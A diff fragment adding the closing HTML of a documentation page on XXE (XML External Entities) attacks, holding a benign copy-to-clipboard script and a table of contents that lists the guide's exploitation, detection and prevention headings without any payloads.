+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#xxe-xml-external-entities">XXE (XML External Entities)</a>
+      <ul>
+        <li><a href="#fundamentals-of-xxe">Fundamentals of XXE</a>
+          <ul>
+            <li><a href="#xml-components">XML Components</a></li>
+            <li><a href="#types-of-xml-entities">Types of XML Entities</a></li>
+            <li><a href="#when-xxe-is-possible">When XXE is Possible</a></li>
+            <li><a href="#requirements">Requirements</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surface">Attack Surface</a></li>
+        <li><a href="#exploitation-techniques">Exploitation Techniques</a>
+          <ul>
+            <li><a href="#1-quick-check-for-xxe"><strong>1. Quick Check for XXE</strong></a></li>
+            <li><a href="#2-classic-file-read-linuxwindows"><strong>2. Classic File Read (Linux/Windows)</strong></a></li>
+            <li><a href="#linux"><strong>Linux:</strong></a></li>
+            <li><a href="#windows"><strong>Windows:</strong></a></li>
+            <li><a href="#3-ssrf-test-internal-network-probe"><strong>3. SSRF Test (Internal Network Probe)</strong></a></li>
+            <li><a href="#4-base64-encoded"><strong>4. Base64 Encoded</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#advanced-xxe-attack-vectors"><strong>Advanced XXE Attack Vectors</strong></a>
+          <ul>
+            <li><a href="#1-blind-xxe-with-out-of-band-oob-data-exfiltration"><strong>1. Blind XXE with Out-of-Band (OOB) Data Exfiltration</strong></a></li>
+            <li><a href="#method-1-classic-oob-via-parameter-entities"><strong>Method 1: Classic OOB via Parameter Entities</strong></a></li>
+            <li><a href="#method-2-error-based-exfiltration"><strong>Method 2: Error-Based Exfiltration</strong></a></li>
+            <li><a href="#method-3-repurposing-a-local-dtd">Method 3: <strong>Repurposing a local DTD</strong></a></li>
+            <li><a href="#2-xxe-inside-non-xml-formats"><strong>2. XXE Inside Non-XML Formats</strong></a></li>
+            <li><a href="#json--xxe-conversion-trick"><strong>JSON → XXE Conversion Trick</strong></a></li>
+            <li><a href="#xxe-in-svg-files"><strong>XXE in SVG Files</strong></a></li>
+            <li><a href="#3-xxe-via-xinclude-bypass-dtd-blocks"><strong>3. XXE via XInclude (Bypass DTD Blocks)</strong></a></li>
+            <li><a href="#4-xxe-in-soap-requests"><strong>4. XXE in SOAP Requests</strong></a></li>
+            <li><a href="#5-xxe-for-rce-rare-but-possible"><strong>5. XXE for RCE (Rare but Possible)</strong></a></li>
+            <li><a href="#phpexpectwrapper"><strong>PHP <code>expect://</code> Wrapper</strong></a></li>
+            <li><a href="#6-billion-laugh-attack">6. <strong>Billion Laugh Attack</strong></a></li>
+            <li><a href="#xslt-based-rce"><strong>XSLT-Based RCE</strong></a></li>
+            <li><a href="#7-bypassing-wafs--filters"><strong>7. Bypassing WAFs &amp; Filters</strong></a></li>
+            <li><a href="#utf-7-bypass"><strong>UTF-7 Bypass</strong></a></li>
+            <li><a href="#cdata--utf-16-bypass"><strong>CDATA + UTF-16 Bypass</strong></a></li>
+            <li><a href="#dtd-in-external-url-with-obfuscation"><strong>DTD in External URL with Obfuscation</strong></a></li>
+            <li><a href="#8-xxe-in-cloud-environments"><strong>8. XXE in Cloud Environments</strong></a></li>
+            <li><a href="#aws-metadata-ssrf"><strong>AWS Metadata SSRF</strong></a></li>
+            <li><a href="#azure-metadata"><strong>Azure Metadata</strong></a></li>
+            <li><a href="#gcp-metadata"><strong>GCP Metadata</strong></a></li>
+            <li><a href="#9-via-changing-content-type">9. <strong>Via Changing Content-Type</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#framework-specific-scenarios">Framework-Specific Scenarios</a>
+          <ul>
+            <li><a href="#java">Java</a></li>
+            <li><a href="#php">PHP</a></li>
+            <li><a href="#net">.NET</a></li>
+            <li><a href="#python">Python</a></li>
+            <li><a href="#nodejs">Node.js</a></li>
+          </ul>
+        </li>
+        <li><a href="#real-world-exploitation-scenarios"><strong>Real-World Exploitation Scenarios</strong></a>
+          <ul>
+            <li><a href="#1-stealing-ssh-keys"><strong>1. Stealing SSH Keys</strong></a></li>
+            <li><a href="#2-reading-database-credentials"><strong>2. Reading Database Credentials</strong></a></li>
+            <li><a href="#3-exploiting-windows-systems"><strong>3. Exploiting Windows Systems</strong></a></li>
+            <li><a href="#4-abusing-php-wrappers"><strong>4. Abusing PHP Wrappers</strong></a></li>
+            <li><a href="#5-xxe-in-pdf-generators"><strong>5. XXE in PDF Generators</strong></a></li>
+            <li><a href="#6-xxe-oob-with-apache-karaf"><strong>6. XXE OOB with Apache Karaf</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#test-cases">Test Cases</a></li>
+        <li><a href="#detection-techniques">Detection Techniques</a>
+          <ul>
+            <li><a href="#manual-detection">Manual Detection</a></li>
+            <li><a href="#automated-detection">Automated Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#prevention-techniques"><strong>Prevention Techniques</strong></a></li>
+        <li><a href="#tools"><strong>Tools</strong></a></li>
+        <li><a href="#good-to-read">Good To Read</a>
+          <ul>
+            <li><a href="#real-cves">Real CVEs</a></li>
+            <li><a href="#hackerone-reports">Hackerone Reports:</a></li>
+          </ul>
+        </li>
+        <li><a href="#references"><strong>References:</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
